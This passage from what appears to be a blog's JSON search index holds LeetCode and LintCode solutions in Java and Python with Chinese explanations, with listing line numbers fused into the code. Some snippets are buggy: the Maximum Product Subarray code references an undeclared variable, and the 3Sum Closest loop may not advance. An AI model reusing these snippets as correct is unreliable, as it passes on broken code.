1-&gt;2-&gt;3-&gt;4-&gt;5, reorder it to 1-&gt;5-&gt;2-&gt;4-&gt;3. * * https://leetcode.com/problems/reorder-list/description/ * * 由于后半部分链表需要倒置，所以很显然能直接想到使用stack， * 所以分成三部分： * 1. 找到中点和终点 * 2. 把中点-终点部分放入stack中 * 3. 依次从链表和stack中取出元素，链接起来 * * * */public class Q143ReorderList &#123; public static void reorderList(ListNode head) &#123; if (head == null || head.next == null) &#123; return; &#125; ListNode mid = head, tail = head.next; boolean odd = false; while ((tail != null) &amp;&amp; ( tail.next != null)) &#123; mid = mid.next; tail = tail.next.next; &#125; // 判断链表个数奇偶 if (tail == null) &#123; odd = true; &#125; Stack&lt;ListNode&gt; stack = new Stack&lt;&gt;(); mid = mid.next; while (mid != tail) &#123; stack.push(mid); mid = mid.next; &#125; if (!odd) &#123; stack.push(mid); &#125; ListNode res = new ListNode(0), pos = head; ListNode tmp = res, tmp2; int size = stack.size(); for (int i = 0; i &lt; size ; i++) &#123; tmp2 = pos.next; // store pos next elem res.next = pos; res.next.next = stack.pop(); res = res.next.next; pos = tmp2; // resotre pos next elem &#125; if (odd) &#123; res.next = pos; res = res.next; &#125; res.next = null; head = tmp; &#125;&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Linked List","slug":"Linked-List","permalink":"http://larryim.cc/tags/Linked-List/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"231. Power of Two","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-231-Power-of-Two/","text":"Given an integer, write a function to determine if it is a power of two. Example 1: Input: 1 Output: true Explanation: 20&nbsp;= 1 Example 2: Input: 16 Output: true Explanation: 24&nbsp;= 16 Example 3: Input: 218Output: false Java2的幂。判断一个整数$n$是否是2的幂，最直接的方法就是不断除以2，看余数是否是1。但需要注意$n=1$时，虽然1除以2的余数是1，但是它是2的幂。注意应该使用右移运算(n &gt;&gt;&gt; 1)，而不是除法(n/2)，因为位运算比除法快得多。 使用递归的代码： 123456public boolean isPowerOfTwo(int n) &#123; if (n &lt;= 0) return false; if (n == 1) return true; if (n % 2 != 0) return false; return isPowerOfTwo(n &gt;&gt;&gt; 1);&#125; 使用迭代的代码： 12345678public boolean isPowerOfTwo(int n) &#123; if (n &lt;= 0) return false; while (n &gt; 1) &#123; if (n % 2 == 1) return false; n &gt;&gt;= 1; &#125; return n == 1 ? true : false;&#125; 仔细思考一下如果一个数是2的幂的话，它的二进制表示有什么特点？有且只有一个数是1，其他都是0。利用此特点，一一检查$n$的二进制表示：有且只有一个1。于是就可以用LeetCode 191. Number of 1 Bits中描述的所有方法。 1234567public boolean isPowerOfTwo(int n) &#123; if (n &lt;= 0) return false; while ((n != 0) &amp;&amp; ((n &amp; 1) != 1)) n &gt;&gt;= 1; n &gt;&gt;= 1; return n == 0; &#125; 使用$n&amp;(n-1)$技巧： 1234public boolean isPowerOfTwo(int n) &#123; if (n &lt;= 0) return false; return (n &amp; (n - 1)) == 0; &#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Bit Manipulation","slug":"Bit-Manipulation","permalink":"http://larryim.cc/tags/Bit-Manipulation/"},{"name":"Math","slug":"Math","permalink":"http://larryim.cc/tags/Math/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"145. Binary Tree Postorder Traversal","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-145-Binary-Tree-Postorder-Traversal/","text":"Given a binary tree, return the postorder traversal of its nodes’ values. Example: 12345678Input: [1,null,2,3] 1 \\ 2 / 3Output: [3,2,1] Follow up: Recursive solution is trivial, could you do it iteratively? Java这道题目和144. Binary Tree Preorder Traversal一摸一样，给出三种方案： 有帮助函数的递归，省去了反复要生成List&lt;Integer&gt;. 123456789101112public List&lt;Integer&gt; postorderTraversal(TreeNode root) &#123; List&lt;Integer&gt; list = new ArrayList&lt;&gt;(); postorderTraversalHelper(root, list); return list;&#125; private void postorderTraversalHelper(TreeNode root, List&lt;Integer&gt; list) &#123; if (root == null) return; postorderTraversalHelper(root.left, list); postorderTraversalHelper(root.right, list); list.add(root.val);&#125; 直接递归: 12345678public List&lt;Integer&gt; postorderTraversal(TreeNode root) &#123; List&lt;Integer&gt; list = new ArrayList&lt;&gt;(); if (root == null) return list; list.addAll(postorderTraversal(root.left)); list.addAll(postorderTraversal(root.right)); list.add(root.val); return list;&#125; 迭代: 1234567891011121314public List&lt;Integer&gt; postorderTraversal(TreeNode root) &#123; List&lt;Integer&gt; list = new ArrayList&lt;&gt;(); Stack&lt;TreeNode&gt; stack = new Stack&lt;&gt;(); stack.push(root); while(!stack.isEmpty()) &#123; TreeNode cur = stack.pop(); if (cur != null) &#123; list.add(0, cur.val); stack.push(cur.left); stack.push(cur.right); &#125; &#125; return list;&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Tree","slug":"Tree","permalink":"http://larryim.cc/tags/Tree/"},{"name":"Stack","slug":"Stack","permalink":"http://larryim.cc/tags/Stack/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"144. Binary Tree Preorder Traversal","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-144-Binary-Tree-Preorder-Traversal/","text":"Given a binary tree, return the preorder traversal of its nodes’ values. Example: 1234567Input: [1,null,2,3] 1 \\ 2 / 3Output: [1,2,3] Follow up: Recursive solution is trivial, could you do it iteratively? Java常见的还是用递归的办法： 123456789101112public List&lt;Integer&gt; preorderTraversal(TreeNode root) &#123; List&lt;Integer&gt; list = new ArrayList&lt;Integer&gt;(); preorderTraversalHelper(root, list); return list;&#125; private void preorderTraversalHelper(TreeNode root, List&lt;Integer&gt; list) &#123; if (root == null) return; list.add(root.val); preorderTraversalHelper(root.left, list); preorderTraversalHelper(root.right, list);&#125; 论坛上有一种非常优美的方法，巧妙的利用了List.addAll()方法： 12345678public List&lt;Integer&gt; preorderTraversal(TreeNode root) &#123; List&lt;Integer&gt; pre = new LinkedList&lt;Integer&gt;(); if(root==null) return pre; pre.add(root.val); pre.addAll(preorderTraversal(root.left)); pre.addAll(preorderTraversal(root.right)); return pre;&#125; 其实上面的LinkedList也可以为ArrayList。 但既然题目都说了，那么用迭代写一下： 123456789101112131415public List&lt;Integer&gt; preorderTraversal(TreeNode root) &#123; List&lt;Integer&gt; list = new ArrayList&lt;&gt;(); Stack&lt;TreeNode&gt; stack = new Stack&lt;&gt;(); stack.push(root); while (!stack.isEmpty()) &#123; TreeNode cur = stack.pop(); if (cur != null) &#123; list.add(cur.val); stack.push(cur.right); stack.push(cur.left); &#125; &#125; return list;&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Tree","slug":"Tree","permalink":"http://larryim.cc/tags/Tree/"},{"name":"Stack","slug":"Stack","permalink":"http://larryim.cc/tags/Stack/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"147. Insertion Sort List","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-147-Insertion-Sort-List/","text":"Sort a linked list using insertion sort. A graphical example of insertion sort. The partial sorted list (black) initially contains only the first element in the list.With each iteration one element (red) is removed from the input data and inserted in-place into the sorted list Algorithm of Insertion Sort: Insertion sort iterates, consuming one input element each repetition, and growing a sorted output list. At each iteration, insertion sort removes one element from the input data, finds the location it belongs within the sorted list, and inserts it there. It repeats until no input elements remain. Example 1: 12Input: 4-&gt;2-&gt;1-&gt;3Output: 1-&gt;2-&gt;3-&gt;4 Example 2: 12Input: -1-&gt;5-&gt;3-&gt;4-&gt;0Output: -1-&gt;0-&gt;3-&gt;4-&gt;5 Java这道题目非常直接，告诉了我们使用的算法-插入排序。但是唯一的区别是这里要排序的数据是链表。最直接的想法是把链表转换为数组，然后排序，然后再还原为链表。 12345678910111213141516171819202122232425262728293031323334353637383940414243public ListNode insertionSortList(ListNode head) &#123; // the length of the Linkedlist int size = 0, i = 0, j = 0; ListNode curList = head; while (curList != null) &#123; curList = curList.next; size++; &#125; // special occasion if (size &lt; 2) return head; // convert LinkedList to an array ListNode[] array = new ListNode[size]; curList = head; while (curList != null) &#123; array[i++] = curList; curList = curList.next; &#125; // insertion sort the array for (i = 1; i &lt; array.length; i++) &#123; j = i; while (j &gt; 0 &amp;&amp; array[j].val &lt; array[j-1].val) &#123; curList = array[j]; array[j] = array[j-1]; array[j - 1] = curList; j--; &#125; &#125; // reconstruct linkedlist ListNode res = array[0]; curList = res; for (i = 1; i &lt; array.length - 1; i++) &#123; curList.next = array[i]; curList = curList.next; &#125; curList.next = array[array.length - 1]; curList.next.next = null; return res;&#125; 当然这种来回的转换其实是非常慢的。有没有一种方法可以直接插入排序呢？有的。这种方法利用了链表的一个特点 – 可以在任意位置插入或者删除一个元素。当用插入排序数组时，我们依次和前面的元素比较，当发现前面的元素大与当前元素时，交换这两种元素，直到前面的元素都小与该元素，这时候该元素就插入到了正确位置。问题是链表需要一一交换吗？根本不需要！既然可以在任意位置删除，只需要一直比较前面的元素，直到发现正确的位置，然后插入到该位置即可。[ref] 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647public ListNode insertionSortList(ListNode head) &#123; if (head == null || head.next == null) &#123; return head; &#125; ListNode sortedHead = head, sortedTail = head; head = head.next; sortedHead.next = null; while (head != null) &#123; ListNode temp = head; head = head.next; temp.next = null; // new val is less than the head, just insert in the front if (temp.val &lt;= sortedHead.val) &#123; temp.next = sortedHead; sortedTail = sortedHead.next == null ? sortedHead : sortedTail; sortedHead = temp; &#125; // new val is greater than the tail, just insert at the back else if (temp.val &gt;= sortedTail.val) &#123; sortedTail.next = temp; sortedTail = sortedTail.next; &#125; // new val is somewhere in the middle, we will have to find its proper // location. else &#123; ListNode current = sortedHead; while (current.next != null &amp;&amp; current.next.val &lt; temp.val) &#123; current = current.next; &#125; temp.next = current.next; current.next = temp; &#125; &#125; return sortedHead;&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Sort","slug":"Sort","permalink":"http://larryim.cc/tags/Sort/"},{"name":"Linked List","slug":"Linked-List","permalink":"http://larryim.cc/tags/Linked-List/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"81. Search in Rotated Sorted Array II","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-81-Search-in-Rotated-Sorted-Array-II/","text":"Suppose an array sorted in ascending order is rotated at some pivot unknown to you beforehand. (i.e., [0,0,1,2,2,5,6] might become [2,5,6,0,0,1,2]). You are given a target value to search. If found in the array return true, otherwise return false. Your algorithm’s runtime complexity must be in the order of $O(\\log n$). Example 1: 12Input: nums = [2,5,6,0,0,1,2], target = 0Output: true 12Input: nums = [2,5,6,0,0,1,2], target = 3Output: false Follow up: This is a follow up problem to Search in Rotated Sorted Array, where nums may contain duplicates. Would this affect the run-time complexity? How and why? Java这道题目和33. Search in Rotated Sorted Array最主要的区别是这里的数字是重复的。其实加上一个判断即可，即考虑特殊情况：nums[start] = nums[mid] = nums[end]。 123456789101112131415161718192021222324public boolean search(int[] nums, int target) &#123; if (nums == null || nums.length == 0) return false; int start = 0, end = nums.length - 1, mid, midVal; while (start &lt;= end) &#123; mid = (start + end) / 2; midVal = nums[mid]; if (midVal == target) return true; //If we know for sure right side is sorted or left side is unsorted if (midVal &gt; nums[start]) &#123; if (midVal &gt; target &amp;&amp; target &gt;= nums[start]) end = mid - 1; else start = mid + 1; //If we know for sure left side is sorted or right side is unsorted &#125; else if (midVal &lt; nums[start]) &#123; if (midVal &lt; target &amp;&amp; target &lt;= nums[end]) start = mid + 1; else end = mid - 1; //If we get here, that means nums[start] = nums[mid] = nums[end], then shifting out //any of the two sides won't change the result but can help remove duplicate from //consideration, here we just use end-- but left++ works too &#125; else &#123; end--; &#125; &#125; return false;&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Array","slug":"Array","permalink":"http://larryim.cc/tags/Array/"},{"name":"Binary Search","slug":"Binary-Search","permalink":"http://larryim.cc/tags/Binary-Search/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"148. Sort List","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-148-Sort-List/","text":"Sort a linked list in $O(n \\log n)$ time using constant space complexity. Example 1: 12Input: 4-&gt;2-&gt;1-&gt;3Output: 1-&gt;2-&gt;3-&gt;4 Example 2: 12Input: -1-&gt;5-&gt;3-&gt;4-&gt;0Output: -1-&gt;0-&gt;3-&gt;4-&gt;5 Java排序链表，要求空间复杂度为$O(1)$，时间复杂度为$O(n\\log n)$。既然要排序，很容易想到常见的排序方法，符合时间复杂度和空间复杂度的排序有快速排序和归并排序。 对于归并排序，把链表拆分成子链表，递归排序子链表，然后再合并链表。链表与数组不同，不能直接索引。为了表示子链表，一种方法是子链表在链表中的首尾位置，另一种更简单的方法是直接用子链表的首部位置表示，而将尾部位置设置为null。这是关键的一步，可以节省很多不必要的麻烦。链表的分割可参考LeetCode 21. Merge Two Sorted Lists，链表的中点可参考LeetCode 876. Middle of the Linked List。 1234567891011121314151617181920212223242526272829303132333435363738public ListNode sortList(ListNode head) &#123; if (head == null || head.next == null) return head; ListNode mid = midList(head); ListNode right = sortList(mid.next); // sort right half mid.next = null; ListNode left = sortList(head); // sort left half return merge(left, right);&#125;// merge linkedlist l1 nad l2private ListNode merge(ListNode left, ListNode right) &#123; // find head of the linkedlist after sorted ListNode head, pos; if (left.val &lt; right.val) &#123; head = left; left = left.next; &#125; else &#123;head = right; right = right.next; &#125; pos = head; // iterate the linked list, link smaller element to head while (left != null &amp;&amp; right != null) &#123; // both iterate to the end of list if (left.val &lt; right.val) &#123; pos.next = left; left = left.next;&#125; else &#123;pos.next = right; right = right.next;&#125; pos = pos.next; &#125; // add remaining linkedlist pos.next = left != null ? left : right; return head;&#125;// find middle node of given linkedlistprivate ListNode midList(ListNode head) &#123; ListNode slow = head, fast = head.next; while (fast != null &amp;&amp; fast.next != null) &#123; slow = slow.next; fast = fast.next.next; &#125; return slow;&#125; 使用快速排序，比归并排序复杂，原因至少有以下几点 无法访问链表的前一个节点，也就意味着传统的partition方法在这里不适用，在partition时，只能将小于pivot的节点插入到pivot前面，将大于pivot的节点插入到pivot后面。 传统的快速排序通过shuffle来保证平均时间复杂度，这里也不能适用。 插入元素的时候，不能适用dummy node，因为空间复杂度必须为$O(1)$，论坛上好多快速排序的答案都不符合要求。 12345678910111213141516171819202122232425262728293031323334public ListNode sortList(ListNode head) &#123; return quickSort(head, null);&#125;public ListNode quickSort(ListNode begin, ListNode end) &#123; // quit condition: only one node if (begin == end) return begin; ListNode head = partition(begin, end); // partition, result: head .... begin...end ListNode h1 = quickSort(head, begin); // sort left part, result: h1... head.... ListNode h2 = quickSort(begin.next, end); // sort right part, result: h2... begin.next... begin.next = h2; return h1;&#125;// use begin as pivot:// left to the begin is less than pivot, right to the begin is larger than pivotListNode partition(ListNode begin, ListNode end) &#123; // head is the head, cur is currently visiting node, pre is the node before cur. ListNode head = begin, pre = head, cur = pre.next; int pivotValue = head.val; //pivot value while (cur != end) &#123; // insert current node before head if it's value is less than pivot if (cur != null &amp;&amp; cur.val &lt; pivotValue) &#123; pre.next = cur.next; cur.next = head; head = cur; &#125; else &#123; pre = cur; &#125; cur = pre.next; &#125; return head;&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Sort","slug":"Sort","permalink":"http://larryim.cc/tags/Sort/"},{"name":"Linked List","slug":"Linked-List","permalink":"http://larryim.cc/tags/Linked-List/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"15. 3Sum","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-15-3-Sum/","text":"Given an array $S$ of $n$ integers, are there elements $a, b, c$ in $S$ such that $a + b + c = 0$? Find all unique triplets in the array which gives the sum of zero. 给出一个有$n$个整数的数组$S$，在$S$中找到三个整数$a, b, c$，找到所有使得$a + b + c = 0$的三元组。 1234567For example, given array S = [-1, 0, 1, 2, -1, -4],A solution set is:[ [-1, 0, 1], [-1, -1, 2]] 求一个列表中所有和为零的二元组的一种思路是先把列表排序，再用两个指针从两头向中间移动。如果前后两个数的和小于0，则左指针右移；如果和大于0，则右指针左移。求三元组时可以参考这种做法，第一个数a确定后，可以理解为求列表中和为-a的二元组。由于不要考虑重复的元组，遇到重复的数可以直接跳过。 123456789101112131415161718192021222324252627282930313233343536373839404142434445class Solution: def threeSum(self, nums): \"\"\" :type nums: List[int] :rtype: List[List[int]] \"\"\" n = len(nums) # 如果为小于3个元素的列表 if n &lt; 3: return [] # 排序 nums = sorted(nums) print(nums) results = [] i = 0 while i &lt; n-2: left = i+1 right = len(nums)-1 while left &lt; right: val = nums[left] + nums[right] + nums[i] if val == 0: results.append([nums[i], nums[left], nums[right]]) print([i, left , right], [nums[i], nums[left], nums[right]]) left += 1 right -= 1 # Ignore repeat numbers while (left &lt; right) and (nums[left] == nums[left-1]): left += 1 while (left &lt; right) and (nums[right] == nums[right+1]): right -= 1 elif val &lt; 0: left += 1 else: right -= 1 i += 1 # Ignore repeat numbers while i &lt; n - 2 and nums[i] == nums[i - 1]: i += 1 return results Runtime: 976 ms","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"77. Longest Common Subsequence","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/LintCode-77-Longest-Common-Subsequence/","text":"Given two strings, find the longest common subsequence (LCS). Your code should return the length of LCS. The definition of Longest Common Subsequence [wiki]: the longest subsequence common to all sequences in a set of sequences (often just two sequences). Unlike substrings, subsequences are not required to occupy consecutive positions within the original sequences. Example: For &quot;ABCD&quot; and &quot;EDCA&quot;, the LCS is &quot;A&quot; (or &quot;D&quot;, &quot;C&quot;), return 1. For &quot;ABCD&quot; and &quot;EACB&quot;, the LCS is &quot;AC&quot;, return 2. Java这道题可以用动态规划解决。定义$c[i, j]$表示$X_i$和$Y_j$的最长公共子序列的长度，可得如下公式： 1234567891011public int longestCommonSubsequence(String A, String B) &#123; int n = A.length(), m = B.length(); int lcs[][] = new int[n + 1][m + 1]; for(int i = 1; i &lt;= n; i++) for(int j = 1; j &lt;= m; j++) if(A.charAt(i - 1) == B.charAt(j - 1)) lcs[i][j] = lcs[i - 1][j - 1] + 1; else lcs[i][j] = Math.max(lcs[i - 1][j], lcs[i][j - 1]); return lcs[n][m];&#125;","tags":[{"name":"LintCode","slug":"LintCode","permalink":"http://larryim.cc/tags/LintCode/"},{"name":"Dynamic Programming","slug":"Dynamic-Programming","permalink":"http://larryim.cc/tags/Dynamic-Programming/"},{"name":"Classic","slug":"Classic","permalink":"http://larryim.cc/tags/Classic/"}],"categories":[{"name":"LintCode","slug":"LintCode","permalink":"http://larryim.cc/categories/LintCode/"}]},{"title":"93. Restore IP Addresses","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-93-Restore-IP-Addresses/","text":"Given a string containing only digits, restore it by returning all possible valid IP address combinations. Example: 12Input: &quot;25525511135&quot;Output: [&quot;255.255.11.135&quot;, &quot;255.255.111.35&quot;] Java要求根据给定字符串，返回有效的IP地址。使用回溯法是非常显而易见的。但是这道题目有几个trick： 每个点号分隔的区间表示的数字在0～255之间，然而像012这样的数字是错误的，不能在前面有0。如果允许的话，12和012是重复的，ip地址不唯一。 为了表示ip地址，只需要记录下点号的位置即可，如果将原字符串频繁的插入、删除点号，那么每次插入和删除的最坏时间复杂度将会是$O(n)$，其中$n$是字符串长度，显然是不实际的。 确认剩下的字符串长度能够有效表示ip地址，可以加快回溯。 12345678910111213141516171819202122232425262728293031323334353637383940private List&lt;String&gt; ipAddresses;public List&lt;String&gt; restoreIpAddresses(String s) &#123; ipAddresses = new ArrayList&lt;&gt;(); LinkedList&lt;Integer&gt; dotPosition = new LinkedList&lt;&gt;(); restoreIpAddressesHelper(s, dotPosition, 0); return ipAddresses;&#125;private void restoreIpAddressesHelper(String s, LinkedList&lt;Integer&gt; dotPosition, int sep)&#123; // check if have valid solution: remaining length is larger than capacity if ((4 - dotPosition.size()) * 3 &lt; s.length() - sep) return; // base case if (dotPosition.size() == 3 &amp;&amp; validSubIP(s, sep, s.length())) &#123; StringBuilder sb = new StringBuilder(s); for (int i = 0; i &lt; 3; i++) sb.insert(dotPosition.get(i) + i, \".\"); ipAddresses.add(sb.toString()); return; &#125; for (int i = 1; i &lt;= 3; i++) if (validSubIP(s, sep, sep + i)) &#123; dotPosition.addLast(sep + i); restoreIpAddressesHelper(s, dotPosition, sep + i); dotPosition.removeLast(); &#125;&#125;// check if a part of ip address is valid: in the range of 0 ~ 255private boolean validSubIP(String s, int start, int end) &#123; // check if start, end is in the range of (0, s.length()) if (start &lt; 0 || end &gt; s.length()) return false; // check length int len = end - start; if ( len &lt;= 0 || len &gt; 3) return false; // check any leading 0: for example 015 is invalid if (len &gt; 1 &amp;&amp; s.charAt(start) == '0') return false; if (len &lt; 3) return true; return s.substring(start, end).compareTo(\"256\") &lt; 0;&#125;","tags":[{"name":"Backtracking","slug":"Backtracking","permalink":"http://larryim.cc/tags/Backtracking/"},{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"String","slug":"String","permalink":"http://larryim.cc/tags/String/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"152. Maximum Product Subarray","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-152-Maximum-Product-Subarray/","text":"Given an integer array nums, find the contiguous subarray within an array (containing at least one number) which has the largest product. Example 1: 123Input: [2,3,-2,4]Output: 6Explanation: [2,3] has the largest product 6. Example 2: 123Input: [-2,0,-1]Output: 0Explanation: The result cannot be 2, because [-2,-1] is not a subarray. Java这道题目非常像LeetCode 53. Maximum Subarray，在Q53中给出连续子数组的最大和，这里要求给出连续子数组的最大乘积。所以想办法把kadane算法改编一下。但是这里的整数可能是负数，也就是说原先为负最小的乘积，在乘以一个负数以后，可能会变最大乘积值。所以还要计算连续子数组的最小乘积。 12345678910111213141516public int maxProduct(int[] nums) &#123; if (nums == null) return 0; int maxSoFar = nums[0], maxEndingHere = nums[0], minSoFar = nums[0], minEndingHere = nums[0]; int tmpMax; for (int i = 1; i &lt; nums.length; i++) &#123; tmp = maxEndingHere; maxEndingHere = Math.max(minEndingHere*nums[i], Math.max(maxEndingHere*nums[i], nums[i])); minEndingHere = Math.min(tmpMax*nums[i], Math.min(minEndingHere*nums[i], nums[i])); maxSoFar = Math.max(maxSoFar, maxEndingHere); minSoFar = Math.min(minSoFar, minEndingHere); &#125; return maxSoFar; &#125;","tags":[{"name":"LintCode","slug":"LintCode","permalink":"http://larryim.cc/tags/LintCode/"},{"name":"Dynamic Programming","slug":"Dynamic-Programming","permalink":"http://larryim.cc/tags/Dynamic-Programming/"},{"name":"Array","slug":"Array","permalink":"http://larryim.cc/tags/Array/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"160. Intersection of Two Linked Lists","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-160-Intersection-of-Two-Linked-Lists/","text":"Write a program to find the node at which the intersection of two singly linked lists begins. For example, the following two linked lists: 12345A: a1 → a2 ↘ c1 → c2 → c3 ↗ B: b1 → b2 → b3 begin to intersect at node c1. Notes: If the two linked lists have no intersection at all, return null. The linked lists must retain their original structure after the function returns. You may assume there are no cycles anywhere in the entire linked structure. Your code should preferably run in O(n) time and use only O(1) memory. Java1234567891011121314151617181920212223242526272829303132333435363738394041424344/** * Write a program to find the node at which the intersection of two singly linked lists begins. * https://leetcode.com/problems/intersection-of-two-linked-lists/description/ * * Notes: * Your code should preferably run in O(n) time and use only O(1) memory. * If the two linked lists have no intersection at all, return null. * The linked lists must retain their original structure after the function returns. * You may assume there are no cycles anywhere in the entire linked structure. * * * Solution: Two Pointers * 使用两个指针，每个指针指向一个链表头部。 * 然后使用指针遍历链表，达到链表尾部后，遍历另一个链表，直到链表尾部。 * * 如果存在交叉，那么这两个指针在第二次遍历以后肯定会相遇。即pointA = pointB， * 如果直到遍历结束，还没有相遇，即没有交叉。题目不要求一定相交。 * * Complexity Analysis * Time complexity : O(m+n)O(m+n). * Space complexity : O(1)O(1). * */public class Q160IntersectionOfTwoLinkedLists &#123; public static ListNode getIntersectionNode(ListNode headA, ListNode headB) &#123; if (headA == null || headB == null) &#123; return null; &#125; ListNode posA = headA, posB = headB; // trick: The number of iteration will be at most one. // If the two linked lists have no intersection at all, // posA and posA will be null at the same time, // and then jump out of the iteration to return a null. while (posA != posB) &#123; posA = (posA == null)? headB : posA.next; posB = (posB == null)? headA : posB.next; &#125; return posA; &#125;&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Two Pointers","slug":"Two-Pointers","permalink":"http://larryim.cc/tags/Two-Pointers/"},{"name":"Linked List","slug":"Linked-List","permalink":"http://larryim.cc/tags/Linked-List/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"153. Find Minimum in Rotated Sorted Array","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-153-Find-Minimum-in-Rotated-Sorted-Array/","text":"Suppose an array sorted in ascending order is rotated at some pivot unknown to you beforehand. (i.e., [0,1,2,4,5,6,7] might become [4,5,6,7,0,1,2]). Find the minimum element. You may assume no duplicate exists in the array. Example 1: 12Input: [3,4,5,1,2] Output: 1 Example 2: 12Input: [4,5,6,7,0,1,2]Output: 0 Java在一个有序数组中查找一个元素可以用二分查找，二分查找也称为折半查找，每次都能将查找区间减半，这种折半特性的算法时间复杂度都为$O(\\log N)$。 本题可以修改二分查找算法进行求解： 当nums$[mid]$ &lt;= nums$[hi]$ 的情况下，说明解在$[lo, mid]$之间，此时令$hi = mid$； 否则解在$[mid + 1, hi]$之间，令$lo = mid + 1$。 12345678910public int findMin(int[] nums) &#123; if (nums == null || nums.length == 0) return 0; int lo = 0, hi = nums.length - 1, mid; while (lo &lt; hi)&#123; mid = (lo + hi)/2; if(nums[mid] &lt;= nums[hi]) hi = mid; else lo = mid + 1; &#125; return nums[lo];&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Array","slug":"Array","permalink":"http://larryim.cc/tags/Array/"},{"name":"Binary Search","slug":"Binary-Search","permalink":"http://larryim.cc/tags/Binary-Search/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"16. 3Sum Closest","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-16-3-Sum-Cloest/","text":"Given an array $S$ of $n$ integers, find three integers in $S$ such that the sum is closest to a given number, target. Return the sum of the three integers. You may assume that each input would have exactly one solution. For example, given array S = {-1 2 1 -4}, and target = 1. The sum that is closest to the target is 2. (-1 + 2 + 1 = 2). 这道题目和前面的3Sum问题差不多，主要是改变了target值，只要在寻找target的过程中，不断更新最接近于target的值就可以了。 12345678910111213141516171819202122232425262728293031323334353637import sysclass Solution: def threeSumClosest(self, nums, target): \"\"\" :type nums: List[int] :type target: int :rtype: int \"\"\" n = len(nums) # 考虑特殊情况 if n &lt; 3: return [] nums = sorted(nums) print(nums) i = 0 approx_target = sys.maxsize while i &lt; n-2: left = i + 1 right = n - 1 while (left &lt; right): val = nums[i] + nums[left] + nums[right] if val == target: return target elif abs(val-target) &lt; abs(approx_target-target): approx_target = val elif val &lt; target: left += 1 else: right -= 1 i += 1 return approx_target Runtime: 136 ms, beats 97.28 %","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"841. Keys and Rooms","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-841-Keys-and-Rooms/","text":"There are $N$ rooms and you start in room 0. Each room has a distinct number in $0, 1, 2, …, N-1$, and each room may have some keys to access the next room. Formally, each room $i$ has a list of keys rooms$[i]$, and each key rooms$[i][j]$ is an integer in $[0, 1, …, N-1]$ where $N$ = rooms.length. A key rooms$[i][j] = v$ opens the room with number $v$. Initially, all the rooms start locked (except for room 0). You can walk back and forth between rooms freely. Return true if and only if you can enter every room. Example 1: 1234567Input: [[1],[2],[3],[]]Output: trueExplanation: We start in room 0, and pick up key 1.We then go to room 1, and pick up key 2.We then go to room 2, and pick up key 3.We then go to room 3. Since we were able to go to every room, we return true. Example 2: 123Input: [[1,3],[3,0,1],[2],[0]]Output: falseExplanation: We can&apos;t enter the room with number 2. Note: 1 &lt;= rooms.length &lt;= 1000 0 &lt;= rooms$[i]$.length &lt;= 1000 The number of keys in all rooms combined is at most 3000. JavaDFS的直接应用。 12345678910111213public boolean 